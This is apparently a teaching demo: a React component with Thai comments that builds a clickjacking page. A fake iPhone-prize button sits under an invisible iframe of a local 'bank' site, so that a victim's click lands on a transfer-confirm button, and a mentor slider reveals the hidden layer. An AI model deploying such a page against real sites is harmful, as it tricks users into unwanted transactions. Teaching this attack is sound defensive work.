import { useState } from 'react';

const HackerTrap = () => {
  const [opacity, setOpacity] = useState(0); // ตั้งเริ่มต้นให้เห็นลางๆ เพื่อการสอน

  return (
    <div className="relative min-h-screen bg-linear-to-br from-slate-50 via-white to-slate-100 overflow-hidden font-sans">
      {/* 🛠️ Mentor Control Panel (UI ส่วนนี้ไม่เกี่ยวกับ Attack แค่เอาไว้โชว์) */}
      <div className="w-[400px] fixed top-6 right-6 z-50 bg-white/80 backdrop-blur-xl p-6 rounded-2xl shadow-lg border border-slate-200/60 max-w-xs">
        <h4 className="text-slate-800 font-semibold mb-2 text-sm tracking-wide">🔥 Mentor Control</h4>
        <p className="text-xs text-slate-500 mb-4 leading-relaxed">
          ปรับความโปร่งใสของเว็บธนาคาร (iframe)
        </p>
        <input
          type="range"
          min="0"
          max="1"
          step="0.01"
          value={opacity}
          onChange={(e) => setOpacity(parseFloat(e.target.value))}
          className="w-full h-1.5 bg-slate-100 rounded-full appearance-none cursor-pointer accent-slate-800"
        />
        <div className="flex justify-between text-[10px] mt-2 text-slate-400 font-medium">
          <span>Hacker เห็น (0)</span>
          <span>น้องๆ เห็น (1)</span>
        </div>
        <div className="mt-4 p-3 bg-slate-50 rounded-xl text-[11px] text-slate-600 leading-relaxed border border-slate-100">
          <strong className="text-slate-800">สถานะ:</strong>{' '}
          {opacity === 0
            ? '⚠️ เลเยอร์ล่องหนสมบูรณ์ ยิง Clickjacking ได้เลย'
            : '👀 กำลังโชว์ Layer ให้ น้องๆ ดู'}
        </div>
      </div>

      {/* 🟢 เลเยอร์ล่าง: เว็บล่อลวง (สิ่งที่เหยื่อเห็น) */}
      <div className="absolute pt-20 inset-0 z-10 flex flex-col items-center justify-center bg-linear-to-br from-blue-50 via-indigo-50 to-purple-50">
        <div className="w-full text-center p-12 bg-white/60 backdrop-blur-xl rounded-3xl border border-white/80 shadow-2xl shadow-slate-200/50 max-w-lg">
          <h1 className="text-7xl mb-6 drop-shadow-sm">🎁</h1>
          <h2 className="text-5xl font-bold text-slate-800 mb-3 tracking-tight">
            คุณคือผู้โชคดี!
          </h2>
          <p className="text-slate-600 text-lg mb-10 font-light leading-relaxed">
            รับสิทธิ์ลุ้นรับ iPhone 16 Pro Max ฟรีทันที
          </p>

          {/* ปุ่มหลอกๆ ที่วางตำแหน่งให้ตรงกับปุ่มยืนยันโอนเงิน */}
          <div className="bg-linear-to-r from-slate-800 to-slate-700 hover:from-slate-700 hover:to-slate-600 text-white font-semibold py-4 px-12 rounded-2xl text-xl shadow-lg shadow-slate-300/50 active:shadow-md active:translate-y-0.5 transition-all cursor-pointer inline-block">
            กดรับรางวัลที่นี่!
          </div>

          <p className="mt-10 text-slate-400 text-xs italic">
            * เงื่อนไขเป็นไปตามที่บริษัทกำหนด
          </p>
        </div>
      </div>

      {/* 🔴 เลเยอร์บน: เว็บธนาคาร (iframe ที่ซ่อนไว้) */}
      {/* pointer-events-auto สำคัญมากเพื่อให้การคลิกไปโดนปุ่มใน iframe */}
      <iframe
        src="http://localhost:5173"
        className="absolute inset-0 w-full h-full z-20 pointer-events-auto"
        style={{ opacity: opacity }}
        title="Victim Site"
      />
    </div>
  );
};

export default HackerTrap;
